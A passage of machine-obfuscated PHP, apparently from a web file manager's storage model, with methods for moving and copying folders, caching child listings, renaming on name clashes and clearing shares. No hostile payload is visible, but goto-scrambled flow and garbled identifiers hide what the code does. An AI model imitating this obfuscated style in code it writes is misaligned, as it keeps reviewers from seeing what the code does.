$C¿¤¹“ïàœ[$EÉğ¡¯öÕ‘[474]]; $C›Áæ²èÌ° = $C¿¤¹“ïàœ[$EÉğ¡¯öÕ‘[381]]; if (!isset($this->_childrenListCache[$C›Áæ²èÌ°]) && $C¿¤¹“ïàœ[$EÉğ¡¯öÕ‘[382]] == $EÉğ¡¯öÕ‘[83]) { $this->_childrenListCache[$C›Áæ²èÌ°] = array(); } if (!isset($this->_childrenListCache[$bÅ¤»ÓšÚ…])) { $this->_childrenListCache[$bÅ¤»ÓšÚ…] = array(); } $this->_childrenListCache[$bÅ¤»ÓšÚ…][$C›Áæ²èÌ°] = $C¿¤¹“ïàœ; $this->_childrenItemCache[$C›Áæ²èÌ°] = $C¿¤¹“ïàœ; } goto B“¾˜æµ‘š; B“¾˜æµ‘š: } private function _childrenListAll($d¡†í‹®¤ô, &$C Ş½¯Áøå) { $E”á¤ŸÂ¼ =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->_childrenListCache[$d¡†í‹®¤ô])) { return; } $fè„Ï‡ìƒñ = $this->_childrenListCache[$d¡†í‹®¤ô]; foreach ($fè„Ï‡ìƒñ as $c•©ëÑ¿Ÿ‚ => $Cß¯ÃÖ°º) { $C Ş½¯Áøå[$c•©ëÑ¿Ÿ‚] = $Cß¯ÃÖ°º; if ($Cß¯ÃÖ°º[$E”á¤ŸÂ¼[382]] == $E”á¤ŸÂ¼[83]) { $this->_childrenListAll($c•©ëÑ¿Ÿ‚, $C Ş½¯Áøå); } } } private function sourceInfoCache($bñ®ÅßôãÈ) { if (isset($this->_childrenItemCache[$bñ®ÅßôãÈ])) { return $this->_childrenItemCache[$bñ®ÅßôãÈ]; } return $this->sourceInfo($bñ®ÅßôãÈ); } private function _childrenList($Bğø×°¤¿ ) { if (isset($this->_childrenListCache[$Bğø×°¤¿ ])) { return $this->_childrenListCache[$Bğø×°¤¿ ]; } return $this->_childrenListSelect($Bğø×°¤¿ ); } private function _childrenListSelect($DáôÇÒˆ·½) { goto CØŞ±×ß—¥; E“é¦Šß„©: foreach ($d¬ˆÚ„èá as $DáôÇÒˆ·½ => $dÆ¦²°¸¼¢) { $this->_childrenItemCache[$DáôÇÒˆ·½] = $dÆ¦²°¸¼¢; } return $d¬ˆÚ„èá; goto eˆùÁ‹Úì; CØŞ±×ß—¥: $fï©ÍîÍìÊ =& $_SERVER[‡’¶øåüç˜]; $d£ÖÅÈŸ”Í = array($fï©ÍîÍìÊ[474] => $DáôÇÒˆ·½, $fï©ÍîÍìÊ[409] => $this->targetIsDelete); $Bç¶Ö©¶È = $this->where($d£ÖÅÈŸ”Í)->select(); goto AÚ¯îõñø”; AÚ¯îõñø”: $Bç¶Ö©¶È = $Bç¶Ö©¶È ? $Bç¶Ö©¶È : array(); $d¬ˆÚ„èá = array_to_keyvalue($Bç¶Ö©¶È, $fï©ÍîÍìÊ[381]); $this->_childrenListCache[$DáôÇÒˆ·½] = $d¬ˆÚ„èá; goto E“é¦Šß„©; eˆùÁ‹Úì: } private function fileNameExistCache($AùéìŞæîÖ, $fÉ×¼íÚ‹³) { $Bç‚°êãºÄ =& $_SERVER[‡’¶øåüç˜]; $fÉ×¼íÚ‹³ = strtolower($fÉ×¼íÚ‹³); $F¯·‰Ø‹† = $this->_childrenList($AùéìŞæîÖ); foreach ($F¯·‰Ø‹† as $Dó±§–ö«Š) { if ($fÉ×¼íÚ‹³ == strtolower($Dó±§–ö«Š[$Bç‚°êãºÄ[28]])) { return $Dó±§–ö«Š[$Bç‚°êãºÄ[381]]; } } return !1; } private function fileNameAutoCache($F¡Îæ÷É•á, $fï¾¼‰ŒŒ», $cÇŠÓ¯ÓÂë, $a¼ƒİ„Ã¹») { $CŞ¬âÊ· =& $_SERVER[‡’¶øåüç˜]; $BÀô’­ÂÂ¦ = $this->_childrenList($F¡Îæ÷É•á); $fíùÔĞï†· = array_to_keyvalue($BÀô’­ÂÂ¦, $CŞ¬âÊ·[33], $CŞ¬âÊ·[28]); return $this->fileNameAutoGet($fíùÔĞï†·, $fï¾¼‰ŒŒ», $cÇŠÓ¯ÓÂë, $a¼ƒİ„Ã¹»); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($F‰†ä·Œ, $CŒªÅÏÔ‰œ, $B¹Ú‡ŸíÈ = REPEAT_REPLACE, $eÛğìÜÈ® = '') { goto C¸î…ªˆŞ„; aëÊùÀğ˜¥: if (!$D™ƒÂšÓÁ¥ || !$dî §éŠÓ» || $dî §éŠÓ»[$d«”¦Î£Ì™[382]] != $d«”¦Î£Ì™[83]) { return !1; } Hook::trigger($d«”¦Î£Ì™[543], $e‰õ¥†á); $this->targetIsDelete = intval($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[409]]); goto EùâÒ£‡í; C¸î…ªˆŞ„: $d«”¦Î£Ì™ =& $_SERVER[‡’¶øåüç˜]; $D™ƒÂšÓÁ¥ = $this->sourceInfo($F‰†ä·Œ); $dî §éŠÓ» = $this->sourceInfo($CŒªÅÏÔ‰œ); goto E»Ñ¼Ñ„‰é; Cš§§Êê…‘: $this->lockWriteStart($CŒªÅÏÔ‰œ, $c¤‰…­‹Ä¿); $fÑ“£Š‚Õ = array($d«”¦Î£Ì™[514] => array(), $d«”¦Î£Ì™[545] => !1); $this->clearShare($F‰†ä·Œ, $CŒªÅÏÔ‰œ); goto CÄ Æà‰Š—; BÍ²ßƒõâ´: if ($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[382]] == $d«”¦Î£Ì™[83] && $c“¡ä±¾í) { $this->folderSizeResetChildren($fäªÍ¯ŞÏÓ); } Model($d«”¦Î£Ì™[171])->linkAdd($fÑ“£Š‚Õ[$d«”¦Î£Ì™[514]]); if ($c“¡ä±¾í && $fÑ“£Š‚Õ[$d«”¦Î£Ì™[545]]) { $this->removeNow($F‰†ä·Œ, !1); } goto Dåë„ÖõÚË; f÷ë•Å–í: return $fäªÍ¯ŞÏÓ; goto D×¤ßğ•ñ; E»Ñ¼Ñ„‰é: if ($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[474]] == $dî §éŠÓ»[$d«”¦Î£Ì™[381]]) { if ($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[409]] == $d«”¦Î£Ì™[83]) { Model($d«”¦Î£Ì™[407])->restore(array($F‰†ä·Œ)); } if (!$eÛğìÜÈ® || $eÛğìÜÈ® == $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[28]]) { return $F‰†ä·Œ; } } $e‰õ¥†á = $this->pathInfoMore($F‰†ä·Œ); if ($this->isParentOf($F‰†ä·Œ, $CŒªÅÏÔ‰œ)) { return !1; } goto aëÊùÀğ˜¥; EùâÒ£‡í: if ($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[474]] == $CŒªÅÏÔ‰œ && $eÛğìÜÈ® != $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[28]]) { $Aãî†º¯È¶ = $this->fileNameExist($CŒªÅÏÔ‰œ, $eÛğìÜÈ®); if ($Aãî†º¯È¶ && $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[382]] == $d«”¦Î£Ì™[481]) { goto b¨æõïæœï; bàÛÖØË‰†: $this->removeNow($F‰†ä·Œ, !1); $this->folderSizeReset($CŒªÅÏÔ‰œ); Hook::trigger($d«”¦Î£Ì™[544], $e‰õ¥†á); goto f×øô­º¾¢; b¨æõïæœï: $d›Ó¹ÑŠ“ = $this->sourceInfo($Aãî†º¯È¶); $fŞ‚ÑÛÌˆì = $this->fileHistory($d›Ó¹ÑŠ“, $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[431]], $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[77]]); if (!$fŞ‚ÑÛÌˆì) { Model($d«”¦Î£Ì™[434])->remove($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[431]]); } goto bàÛÖØË‰†; f×øô­º¾¢: return $Aãî†º¯È¶; goto C¬‚Û•äµÛ; C¬‚Û•äµÛ: } } $c¤‰…­‹Ä¿ = $eÛğìÜÈ® ? $eÛğìÜÈ® : $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[28]]; $this->lockMoveStart($F‰†ä·Œ); goto Cš§§Êê…‘; bî·ƒáŠ‡æ: $this->updateModifyTime($b‹¯°çªÆ); Model($d«”¦Î£Ì™[518])->eventMove($F‰†ä·Œ, $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[474]], $CŒªÅÏÔ‰œ); Hook::trigger($d«”¦Î£Ì™[544], $e‰õ¥†á); goto f÷ë•Å–í; Dåë„ÖõÚË: $this->lockMoveEnd($F‰†ä·Œ); $this->lockWriteEnd($CŒªÅÏÔ‰œ, $c¤‰…­‹Ä¿); $this->folderSizeReset($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[474]]); goto BÙó‰Ñ®ò; BÙó‰Ñ®ò: $this->folderSizeReset($CŒªÅÏÔ‰œ); $b‹¯°çªÆ = array($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[474]], $CŒªÅÏÔ‰œ); if ($D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[382]] == $d«”¦Î£Ì™[83]) { $b‹¯°çªÆ[] = $F‰†ä·Œ; } goto bî·ƒáŠ‡æ; CÄ Æà‰Š—: $c“¡ä±¾í = $this->fileNameExistCache($CŒªÅÏÔ‰œ, $D™ƒÂšÓÁ¥[$d«”¦Î£Ì™[28]]); $fäªÍ¯ŞÏÓ = $this->_move($F‰†ä·Œ, $CŒªÅÏÔ‰œ, $B¹Ú‡ŸíÈ, $fÑ“£Š‚Õ, $eÛğìÜÈ®); $this->sourceCacheClear(); goto BÍ²ßƒõâ´; D×¤ßğ•ñ: } private function _move($aİ¡™«îËæ, $ašÂõĞª°Â, $AÅÀªøòŒ¯, &$aØ¾×é©©, $eµš…‡Â÷Ö = '') { goto d«ÏÖ‹ˆÉ; d«ÏÖ‹ˆÉ: $EÒˆ† … =& $_SERVER[‡’¶øåüç˜]; $aÏŠ‚åçŠä = $this->sourceInfo($aİ¡™«îËæ); $FÑŞå˜Œ©” = $aÏŠ‚åçŠä[$EÒˆ† …[382]] == $EÒˆ† …[83]; goto cèô‘´‘È; c–øöâ‚¤‡: return $Eç÷‚®ë½; goto C¶ùÊµæã; cèô‘´‘È: $Ašì°ÀÉƒî = $eµš…‡Â÷Ö ? $eµš…‡Â÷Ö : $aÏŠ‚åçŠä[$EÒˆ† …[28]]; $F…Üœ´É…¿ = $this->fileNameExistCache($ašÂõĞª°Â, $Ašì°ÀÉƒî); $this->lockMoveStart($aİ¡™«îËæ); goto dÌ¢ñÎ¢±½; Fä³“¾¹è§: $dÜ¬øÍÙŠß = !1; if ($FÑŞå˜Œ©”) { if ($AÅÀªøòŒ¯ == REPEAT_RENAME_FOLDER) { $Ašì°ÀÉƒî = $this->fileNameAuto($ašÂõĞª°Â, $Ašì°ÀÉƒî, $AÅÀªøòŒ¯, $FÑŞå˜Œ©”); $Eç÷‚®ë½ = $this->_moveForce($aİ¡™«îËæ, $ašÂõĞª°Â, $Ašì°ÀÉƒî); } else { if ($AÅÀªøòŒ¯ == REPEAT_RENAME_FOLDER) { $AÅÀªøòŒ¯ = REPEAT_RENAME; } $Bğè‹Ü´¥ = $this->_childrenListSelect($aİ¡™«îËæ); foreach ($Bğè‹Ü´¥ as $A´§íóÒÊõ) { $this->_move($A´§íóÒÊõ[$EÒˆ† …[381]], $F…Üœ´É…¿, $AÅÀªøòŒ¯, $aØ¾×é©©); } $dÜ¬øÍÙŠß = !0; } } else { if ($AÅÀªøòŒ¯ == REPEAT_SKIP) { $dÜ¬øÍÙŠß = !0; } else { if ($AÅÀªøòŒ¯ == REPEAT_RENAME || $AÅÀªøòŒ¯ == REPEAT_RENAME_FOLDER) { $Ašì°ÀÉƒî = $this->fileNameAuto($ašÂõĞª°Â, $Ašì°ÀÉƒî, $AÅÀªøòŒ¯, $FÑŞå˜Œ©”); $Eç÷‚®ë½ = $this->_moveForce($aİ¡™«îËæ, $ašÂõĞª°Â, $Ašì°ÀÉƒî); } else { if ($AÅÀªøòŒ¯ == REPEAT_REPLACE) { $dé’Õ™ØêÅ = $this->sourceInfoCache($F…Üœ´É…¿); $c¸¶«‚¯’ = $this->fileHistory($dé’Õ™ØêÅ, $aÏŠ‚åçŠä[$EÒˆ† …[431]], $aÏŠ‚åçŠä[$EÒˆ† …[77]]); if ($c¸¶«‚¯’) { $aØ¾×é©©[$EÒˆ† …[514]][] = $aÏŠ‚åçŠä[$EÒˆ† …[431]]; } else { $dÜ¬øÍÙŠß = !0; } } } } } if ($dÜ¬øÍÙŠß && !$aØ¾×é©©[$EÒˆ† …[545]]) { $aØ¾×é©©[$EÒˆ† …[545]] = !0; } goto c–øöâ‚¤‡; dÌ¢ñÎ¢±½: $this->lockWriteStart($ašÂõĞª°Â, $Ašì°ÀÉƒî); if (!$F…Üœ´É…¿) { return $this->_moveForce($aİ¡™«îËæ, $ašÂõĞª°Â, $Ašì°ÀÉƒî); } $Eç÷‚®ë½ = $F…Üœ´É…¿; goto Fä³“¾¹è§; C¶ùÊµæã: } private function _moveForce($fŸÃé‡‡¹, $DªÅª“…, $A®˜à‰¯Æó) { goto e«ò–ãÁ®ß; BŸê“ƒ¢—ö: if (!$EöÚáñø›Š) { Model($F“Ä”Éá´[467])->authClear($fŸÃé‡‡¹); } $aŒññ«øô = $Aµö®¤Û‚[$F“Ä”Éá´[409]] == $F“Ä”Éá´[83] && $bÒ«õ®¸½[$F“Ä”Éá´[409]] != $F“Ä”Éá´[83]; if ($aŒññ«øô) { $b¢ÕÒ’ƒÈ¥[$F“Ä”Éá´[408]] = 0; } goto A™ºÙÖÃš; b—ã¡ææïŠ: $a“ö›«Ù± = $Aµö®¤Û‚[$F“Ä”Éá´[382]] == $F“Ä”Éá´[83]; $b¢ÕÒ’ƒÈ¥ = array($F“Ä”Éá´[380] => $bÒ«õ®¸½[$F“Ä”Éá´[381]], $F“Ä”Éá´[538] => $bÒ«õ®¸½[$F“Ä”Éá´[472]] . $bÒ«õ®¸½[$F“Ä”Éá´[381]] . $F“Ä”Éá´[47], $F“Ä”Éá´[534] => $bÒ«õ®¸½[$F“Ä”Éá´[383]], $F“Ä”Éá´[535] => $bÒ«õ®¸½[$F“Ä”Éá´[469]], $F“Ä”Éá´[537] => USER_ID, $F“Ä”Éá´[398] => $A®˜à‰¯Æó); $EöÚáñø›Š = $Aµö®¤Û‚[$F“Ä”Éá´[383]] == SourceModel::TYPE_GROUP && $bÒ«õ®¸½[$F“Ä”Éá´[383]] == SourceModel::TYPE_GROUP && $Aµö®¤Û‚[$F“Ä”Éá´[469]] == $bÒ«õ®¸½[$F“Ä”Éá´[469]]; goto BŸê“ƒ¢—ö; A™ºÙÖÃš: if ($a“ö›«Ù±) { $BöÜÄ¤í¯Ã = array($F“Ä”Éá´[538] => array($F“Ä”Éá´[496], $Aµö®¤Û‚[$F“Ä”Éá´[472]] . $Aµö®¤Û‚[$F“Ä”Éá´[381]] . $F“Ä”Éá´[497])); $cÈí¿Ã½Ç = $Aµö®¤Û‚[$F“Ä”Éá´[472]] . $Aµö®¤Û‚[$F“Ä”Éá´[381]] . $F“Ä”Éá´[47]; $E«ŒÔ¿Äó¾ = $bÒ«õ®¸½[$F“Ä”Éá´[472]] . $bÒ«õ®¸½[$F“Ä”Éá´[381]] . $F“Ä”Éá´[47] . $Aµö®¤Û‚[$F“Ä”Éá´[381]] . $F“Ä”Éá´[47]; $Eª ë©¨Ùã = array($F“Ä”Éá´[538] => array($F“Ä”Éá´[546], "\162\145\x70\154\x61\143\x65\50\160\141\x72\145\x6e\164\114\145\x76\x65\154\x2c\x27{$cÈí¿Ã½Ç}\x27\54\47{$E«ŒÔ¿Äó¾}\47\x29"), $F“Ä”Éá´[534] => $bÒ«õ®¸½[$F“Ä”Éá´[383]], $F“Ä”Éá´[535] => $bÒ«õ®¸½[$F“Ä”Éá´[469]]); if ($aŒññ«øô) { $Eª ë©¨Ùã[$F“Ä”Éá´[408]] = 0; } $this->where($BöÜÄ¤í¯Ã)->data($Eª ë©¨Ùã)->save(); } $this->where(array($F“Ä”Éá´[395] => $fŸÃé‡‡¹))->data($b¢ÕÒ’ƒÈ¥)->save(); return $fŸÃé‡‡¹; goto eøğÊ•ãğ; e«ò–ãÁ®ß: $F“Ä”Éá´ =& $_SERVER[‡’¶øåüç˜]; $Aµö®¤Û‚ = $this->sourceInfo($fŸÃé‡‡¹); $bÒ«õ®¸½ = $this->sourceInfo($DªÅª“…); goto b—ã¡ææïŠ; eøğÊ•ãğ: } private function clearShare($e…èÎëØóŒ, $eÀ­†ã¦Ç) { goto bÚ‡òÎ¨»µ; bÚ‡òÎ¨»µ: $d«”è‚Ñêé =& $_SERVER[‡’¶øåüç˜]; $F÷àƒ½…Šˆ = $this->sourceInfo($e…èÎëØóŒ); $CãÁŒé¬ = $this->sourceInfo($eÀ­†ã¦Ç); goto E­ñÜîãî©; DŸäàÎ‰Å: if (!$BÂ²ªÃŸÚ¦) { return; } $BÂ²ªÃŸÚ¦ = array_to_keyvalue($BÂ²ªÃŸÚ¦, $d«”è‚Ñêé[33], $d«”è‚Ñêé[452]); $eÌ»‰É•å° = array($d«”è‚Ñêé[452] => array($d«”è‚Ñêé[7], $BÂ²ªÃŸÚ¦)); goto b¹Æ’ æÛ¹; E­ñÜîãî©: if ($F÷àƒ½…Šˆ[$d«”è‚Ñêé[469]] == $CãÁŒé¬[$d«”è‚Ñêé[469]] && $F÷àƒ½…Šˆ[$d«”è‚Ñêé[383]] == $d«”è‚Ñêé[547]) { return; } $eÌ»‰É•å° = array($d«”è‚Ñêé[472] => array($d«”è‚Ñêé[496], $F÷àƒ½…Šˆ[$d«”è‚Ñêé[472]] . $e…èÎëØóŒ . $d«”è‚Ñêé[497])); $Cæßªµ Ë³ = $this->field($d«”è‚Ñêé[395])->where($eÌ»‰É•å°)->getField($d«”è‚Ñêé[381], !0); goto Aë¹‹¿Éñ¥; b¹Æ’ æÛ¹: Model($d«”è‚Ñêé[548])->where($eÌ»‰É•å°)->save(array($d«”è‚Ñêé[459] => 0)); Model($d«”è‚Ñêé[549])->where($eÌ»‰É•å°)->delete(); goto dçÇà¼†Ó; Aë¹‹¿Éñ¥: if (!$Cæßªµ Ë³) { return; } $eÌ»‰É•å° = array($d«”è‚Ñêé[381] => array($d«”è‚Ñêé[7], $Cæßªµ Ë³), $d«”è‚Ñêé[459] => 1); $BÂ²ªÃŸÚ¦ = Model($d«”è‚Ñêé[548])->field($d«”è‚Ñêé[452])->where($eÌ»‰É•å°)->select(); goto DŸäàÎ‰Å; dçÇà¼†Ó: } public function copyFolderFromIO($D‚çÃáßÃè, $DÙÙœ³ÚÏ™, $bÅˆ¹ŒÄ›, $EèÆ±Š, $dß¥ÆóÀö…, $a³ÂßßŒ“Ÿ = false) { goto añâ©øØÏ¼; C‹¬â˜‚ö: Model($cÍŒÅ‹÷Ûª[434])->linkAdd($BÖÈ®‚¤ [$cÍŒÅ‹÷Ûª[514]]); Model($cÍŒÅ‹÷Ûª[434])->remove($BÖÈ®‚¤ [$cÍŒÅ‹÷Ûª[550]]); $this->folderSizeReset($bÅˆ¹ŒÄ›); goto fµ£Ç´˜ù·; Cå‹òµ«—‚: Model($cÍŒÅ‹÷Ûª[517])->addAll($BÖÈ®‚¤ [$cÍŒÅ‹÷Ûª[515]], array(), !0); Model($cÍŒÅ‹÷Ûª[518])->eventCopy($cÖ±øõ¦õ˜); $this->saveAll($BÖÈ®‚¤ [$cÍŒÅ‹÷Ûª[516]]); goto C‹¬â˜‚ö; fµ£Ç´˜ù·: $this->updateModifyTime($bÅˆ¹ŒÄ›); return $cÖ±øõ¦õ˜; goto E¡šÂœÎÄã; f¸äÇÛìŞç: Hook::trigger($cÍŒÅ‹÷Ûª[552]); if ($cÖ±øõ¦õ˜) { $this->folderSizeResetChildren($cÖ±øõ¦õ˜); } $this->_childrenListClear(); goto Cå‹òµ«—‚; eó’×¦: if ($Fá¬Œ‚“Ë) { $this->_childrenAllMake($Fá¬Œ‚“Ë); } Hook::trigger($cÍŒÅ‹÷Ûª[551]); $this->_copyChildTo($D‚çÃáßÃè, $DÙÙœ³ÚÏ™, $cÖ±øõ¦õ˜, $EèÆ±Š, $BÖÈ®‚¤ , $dß¥ÆóÀö…); goto f¸äÇÛìŞç; f‰Ó‘ß¹†: $Fá¬Œ‚“Ë = $this->fileNameExist($bÅˆ¹ŒÄ›, $Bİñä¦Ââ‘); $cÖ±øõ¦õ˜ = $this->mkdir($bÅˆ¹ŒÄ›, $Bİñä¦Ââ‘, $EèÆ±Š); if (!$Fá¬Œ‚“Ë || $EèÆ±Š == REPEAT_RENAME_FOLDER) { $EèÆ±Š = !1; } goto eó’×¦; añâ©øØÏ¼: $cÍŒÅ‹÷Ûª =& $_SERVER[‡’¶øåüç˜]; $BÖÈ®‚¤  = array($cÍŒÅ‹÷Ûª[515] => array(), $cÍŒÅ‹÷Ûª[516] => array(), $cÍŒÅ‹÷Ûª[514] => array(), $cÍŒÅ‹÷Ûª[550] => array()); $Bİñä¦Ââ‘ = $a³ÂßßŒ“Ÿ ? $a³ÂßßŒ“Ÿ : $D‚çÃáßÃè->getPathName($D‚çÃáßÃè->pathThis($DÙÙœ³ÚÏ™)); goto f‰Ó‘ß¹†; E¡šÂœÎÄã: } private function _copyChildTo($E„ğÕ÷¾…ğ, $E¢Û–…«”´, $aâ§Ñë·ï, $F·Œ‰ÅÔ±ˆ, &$e»¢ØÓ‡ï°, $aˆ“‘–¼à‚) { goto fÊº½Ö®Şª; fÙÏëÆ¶‚í: $E¯Î½ä¿ó® = $this->_childrenList($aâ§Ñë·ï); $E¯Î½ä¿ó® = array_to_keyvalue($E¯Î½ä¿ó®, $e¹ÚĞÛí¯á[28]); foreach ($FùåÅ™Ïæˆ as $b°—Ü¬†–²) { $F…Œ£Ã® = $E¯Î½ä¿ó®[$b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]]]; $d‡ƒÑµ·ˆ = $F…Œ£Ã®[$e¹ÚĞÛí¯á[381]]; $this->_copyApplyMeta($F…Œ£Ã®, $e»¢ØÓ‡ï°); if ($b°—Ü¬†–²[$e¹ÚĞÛí¯á[29]] == $e¹ÚĞÛí¯á[76]) { $b°—Ü¬†–²[$e¹ÚĞÛí¯á[75]] = $E„ğÕ÷¾…ğ->getPathInner($b°—Ü¬†–²[$e¹ÚĞÛí¯á[75]]); $this->_copyChildTo($E„ğÕ÷¾…ğ, $b°—Ü¬†–²[$e¹ÚĞÛí¯á[75]], $d‡ƒÑµ·ˆ, $F·Œ‰ÅÔ±ˆ, $e»¢ØÓ‡ï°, $aˆ“‘–¼à‚); } } goto b´²…Äíß; d¨ºĞ“±¦Œ: $FùåÅ™Ïæˆ = array_merge($BğùêäæŒ¥[$e¹ÚĞÛí¯á[73]], $BğùêäæŒ¥[$e¹ÚĞÛí¯á[74]]); $c’Š…¨œ = $this->_addFiles($E„ğÕ÷¾…ğ, $BğùêäæŒ¥[$e¹ÚĞÛí¯á[73]], $aˆ“‘–¼à‚); $aµÕ­àö¦† = array(); goto fˆÃÌ²ªÂÊ; fÊº½Ö®Şª: $e¹ÚĞÛí¯á =& $_SERVER[‡’¶øåüç˜]; $F—‚”©Üˆˆ = $this->sourceInfoCache($aâ§Ñë·ï); $BğùêäæŒ¥ = $E„ğÕ÷¾…ğ->listPath($E¢Û–…«”´, !1, !0); goto d¨ºĞ“±¦Œ; fˆÃÌ²ªÂÊ: foreach ($FùåÅ™Ïæˆ as &$b°—Ü¬†–²) { goto AâÇ™‹ã¡Í; c‰ã·ë÷ë¸: if ($F·Œ‰ÅÔ±ˆ) { $C—º“°Ú–¸ = $this->fileNameExistCache($aâ§Ñë·ï, $b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]]); if ($C—º“°Ú–¸) { if ($b°—Ü¬†–²[$e¹ÚĞÛí¯á[382]] || $F·Œ‰ÅÔ±ˆ == REPEAT_SKIP) { continue; } if ($F·Œ‰ÅÔ±ˆ == REPEAT_REPLACE) { $F…Œ£Ã® = $this->sourceInfoCache($C—º“°Ú–¸); $B’·òùÏå˜ = $this->fileHistory($F…Œ£Ã®, $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]], $b°—Ü¬†–²[$e¹ÚĞÛí¯á[77]]); if ($B’·òùÏå˜) { $e»¢ØÓ‡ï°[$e¹ÚĞÛí¯á[514]][] = $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]]; } continue; } else { if ($F·Œ‰ÅÔ±ˆ == REPEAT_RENAME) { $b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]] = $this->fileNameAutoCache($aâ§Ñë·ï, $b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]], $F·Œ‰ÅÔ±ˆ, !1); } } } } if (!$b°—Ü¬†–²[$e¹ÚĞÛí¯á[382]] && $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]]) { $e»¢ØÓ‡ï°[$e¹ÚĞÛí¯á[514]][] = $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]]; } $aµÕ­àö¦†[] = $this->_makeItemData($b°—Ü¬†–², $F—‚”©Üˆˆ, $b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]]); goto cÅ§Ã¨æƒ; AâÇ™‹ã¡Í: if (isset($c’Š…¨œ[$b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]]])) { $b°—Ü¬†–² = $c’Š…¨œ[$b°—Ü¬†–²[$e¹ÚĞÛí¯á[28]]]; } $b°—Ü¬†–²[$e¹ÚĞÛí¯á[382]] = $b°—Ü¬†–²[$e¹ÚĞÛí¯á[29]] == $e¹ÚĞÛí¯á[76]; $b°—Ü¬†–²[$e¹ÚĞÛí¯á[384]] = _get($b°—Ü¬†–², $e¹ÚĞÛí¯á[165], $e¹ÚĞÛí¯á[33]); goto b¦ŒŞ†îÈ; b¦ŒŞ†îÈ: $b°—Ü¬†–²[$e¹ÚĞÛí¯á[77]] = _get($b°—Ü¬†–², $e¹ÚĞÛí¯á[77], 0); $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]] = _get($b°—Ü¬†–², $e¹ÚĞÛí¯á[431], 0); if (!isset($b°—Ü¬†–²[$e¹ÚĞÛí¯á[553]]) && $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]]) { $e»¢ØÓ‡ï°[$e¹ÚĞÛí¯á[550]][] = $b°—Ü¬†–²[$e¹ÚĞÛí¯á[431]]; } goto c‰ã·ë÷ë¸; cÅ§Ã¨æƒ: } unset($b°—Ü¬†–²); if (!empty($aµÕ­àö¦†)) { $this->addAll($aµÕ­àö¦†); } goto fÙÏëÆ¶‚í; b´²…Äíß: } private function _addFiles($cŒ¹Ğƒ¦ø¥, $dŠ…ÚäÎï, $E¥§¦ÍŞê) { goto eËâ×ïÜ‹˜; aÆ²Š±‹ç®: foreach ($dŠ…ÚäÎï as &$bºÁÂ¢§æÀ) { goto d†Í‹«Ğè£; b«“ÎÀÒé : if (count($bÄ¾¢“×ãÃ[$fùäíÈ¾]) > 1) { $bºÁÂ¢§æÀ[$a‘›·©îØ¡[553]] = !0; } goto Fİ¥ñÖŸ™©; Cé»ÈËŒÅ: $bºÁÂ¢§æÀ[$a‘›·©îØ¡[167]] = $fùäíÈ¾; Hook::trigger($a‘›·©îØ¡[555], $bºÁÂ¢§æÀ); $bÄ¾¢“×ãÃ[$fùäíÈ¾][] =& $bºÁÂ¢§æÀ; goto b«“ÎÀÒé ; Cê‘ç›¸† : $fùäíÈ¾ = $cŒ¹Ğƒ¦ø¥->hashMd5($bºÁÂ¢§æÀ[$a‘›·©îØ¡[75]]); if (strlen($fùäíÈ¾) > 10 && !isset($bÄ¾¢“×ãÃ[$fùäíÈ¾])) { $bÄ¾¢“×ãÃ[$fùäíÈ¾] = array(); } $bºÁÂ¢§æÀ[$a‘›·©îØ¡[168]] = $fÍë½©ïô‘; goto Cé»ÈËŒÅ; d†Í‹«Ğè£: Hook::trigger($a‘›·©îØ¡[554], $bºÁÂ¢§æÀ); $bºÁÂ¢§æÀ[$a‘›·©îØ¡[75]] = $cŒ¹Ğƒ¦ø¥->getPathInner($bºÁÂ¢§æÀ[$a‘›·©îØ¡[75]]); $fÍë½©ïô‘ = $cŒ¹Ğƒ¦ø¥->hashSimple($bºÁÂ¢§æÀ[$a‘›·©îØ¡[75]]); goto Cê‘ç›¸† ; Fİ¥ñÖŸ™©: } unset($bºÁÂ¢§æÀ); $C§™ˆ¾´ = array($a‘›·©îØ¡[167] => array($a‘›·©îØ¡[7], array_keys($bÄ¾¢“×ãÃ))); goto e‰¦„òçº; dø‹íìéÑ: foreach ($C¸Ì­È¡¬ as $FÜÙÈ”î©) { if (!isset($bÄ¾¢“×ãÃ[$FÜÙÈ”î©[$a‘›·©îØ¡[167]]])) { continue; } $E¾îœ³‰íí = $bÄ¾¢“×ãÃ[$FÜÙÈ”î©[$a‘›·©îØ¡[167]]]; foreach ($E¾îœ³‰íí as &$bºÁÂ¢§æÀ) { $bºÁÂ¢§æÀ[$a‘›·©îØ¡[431]] = $FÜÙÈ”î©[$a‘›·©îØ¡[431]]; $bºÁÂ¢§æÀ[$a‘›·©îØ¡[553]] = !0; } unset($bºÁÂ¢§æÀ); } $dÜóø¬Îø„ = array(); foreach ($dŠ…ÚäÎï as $eİº“Ù±’š) { if (isset($eİº“Ù±’š[$a‘›·©îØ¡[553]]) && $eİº“Ù±’š[$a‘›·©îØ¡[553]]) { continue; } $F„† ’×ì“ = 